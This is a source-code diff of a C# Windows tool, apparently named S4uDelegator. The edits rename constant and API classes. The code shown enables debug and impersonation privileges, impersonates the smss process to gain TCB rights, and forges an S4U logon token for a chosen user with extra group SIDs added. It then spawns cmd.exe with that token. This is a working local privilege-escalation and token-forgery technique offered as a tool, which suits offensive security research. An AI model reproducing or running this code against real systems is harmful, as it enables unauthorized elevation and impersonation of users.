@@ -7,7 +7,7 @@ using S4uDelegator.Interop;
 
 namespace S4uDelegator.Library
 {
-    class Modules
+    internal class Modules
     {
         public static bool GetShell(
             string domain,
@@ -38,16 +38,16 @@ namespace S4uDelegator.Library
 
             IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
             var privs = new string[] {
-                Win32Const.SE_DEBUG_NAME,
-                Win32Const.SE_IMPERSONATE_NAME
+                Win32Consts.SE_DEBUG_NAME,
+                Win32Consts.SE_IMPERSONATE_NAME
             };
 
             if (!Utilities.EnableMultiplePrivileges(hCurrentToken, privs))
                 return false;
 
             privs = new string[] {
-                Win32Const.SE_TCB_NAME,
-                Win32Const.SE_ASSIGNPRIMARYTOKEN_NAME
+                Win32Consts.SE_TCB_NAME,
+                Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME
             };
 
             if (!Utilities.ImpersonateAsSmss(privs))
@@ -63,7 +63,7 @@ namespace S4uDelegator.Library
                 hPrimaryToken = Utilities.GetMsvS4uLogonToken(
                     username,
                     domain,
-                    Win32Const.SECURITY_LOGON_TYPE.Network,
+                    SECURITY_LOGON_TYPE.Network,
                     groupSids);
             }
             else
@@ -71,21 +71,21 @@ namespace S4uDelegator.Library
                 hImpersonationToken = Utilities.GetKerbS4uLogonToken(
                     username,
                     domain,
-                    Win32Const.SECURITY_LOGON_TYPE.Network,
+                    SECURITY_LOGON_TYPE.Network,
                     groupSids);
 
                 if (hImpersonationToken == IntPtr.Zero)
                     return false;
 
-                status = Win32Api.DuplicateTokenEx(
+                status = NativeMethods.DuplicateTokenEx(
                     hImpersonationToken,
-                    Win32Const.TokenAccessFlags.TOKEN_ALL_ACCESS,
+                    TokenAccessFlags.TOKEN_ALL_ACCESS,
                     IntPtr.Zero,
-                    Win32Const.SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
-                    Win32Const.TOKEN_TYPE.TokenPrimary,
+                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
+                    TOKEN_TYPE.TokenPrimary,
                     out hPrimaryToken);
 
-                Win32Api.CloseHandle(hImpersonationToken);
+                NativeMethods.CloseHandle(hImpersonationToken);
 
                 if (!status)
                 {
@@ -104,7 +104,7 @@ namespace S4uDelegator.Library
                 hPrimaryToken,
                 "C:\\Windows\\System32\\cmd.exe");
 
-            Win32Api.CloseHandle(hPrimaryToken);
+            NativeMethods.CloseHandle(hPrimaryToken);
 
             return status;
         }
@@ -141,7 +141,7 @@ namespace S4uDelegator.Library
 
                 result = Helpers.ConvertAccountNameToSidString(
                     ref accountName,
-                    out Win32Const.SID_NAME_USE peUse);
+                    out SID_NAME_USE peUse);
 
                 if (!string.IsNullOrEmpty(result))
                 {
@@ -165,7 +165,7 @@ namespace S4uDelegator.Library
             {
                 result = Helpers.ConvertSidStringToAccountName(
                     ref sid,
-                    out Win32Const.SID_NAME_USE peUse);
+                    out SID_NAME_USE peUse);
 
                 if (!string.IsNullOrEmpty(result))
                 {
@@ -205,7 +205,7 @@ namespace S4uDelegator.Library
             string fqdn = currentDomain;
             string localSid = Helpers.ConvertAccountNameToSidString(
                 ref computerName,
-                out Win32Const.SID_NAME_USE peUse);
+                out SID_NAME_USE peUse);
             string domainSid;
             string accountName;
             string accountSid;
@@ -264,7 +264,7 @@ namespace S4uDelegator.Library
             if (!string.IsNullOrEmpty(accountName) &&
                 !string.IsNullOrEmpty(accountSid))
             {
-                if (peUse != Win32Const.SID_NAME_USE.SidTypeUser)
+                if (peUse != SID_NAME_USE.SidTypeUser)
                 {
                     Console.WriteLine("[-] Target account should be user account.\n");
 
@@ -346,7 +346,7 @@ namespace S4uDelegator.Library
 
                     accountName = Helpers.ConvertSidStringToAccountName(
                         ref groupSids[idx],
-                        out Win32Const.SID_NAME_USE peUse);
+                        out SID_NAME_USE peUse);
 
                     if (string.IsNullOrEmpty(accountName))
                     {
@@ -354,8 +354,8 @@ namespace S4uDelegator.Library
                             "    |-> [IGNORED] Failed to resolve {0}.",
                             groupSids[idx].ToUpper());
                     }
-                    else if ((peUse == Win32Const.SID_NAME_USE.SidTypeGroup) ||
-                        (peUse == Win32Const.SID_NAME_USE.SidTypeWellKnownGroup))
+                    else if ((peUse == SID_NAME_USE.SidTypeGroup) ||
+                        (peUse == SID_NAME_USE.SidTypeWellKnownGroup))
                     {
                         Console.WriteLine(
                             "    |-> [VALID] {0} (SID : {1}) will be added.",
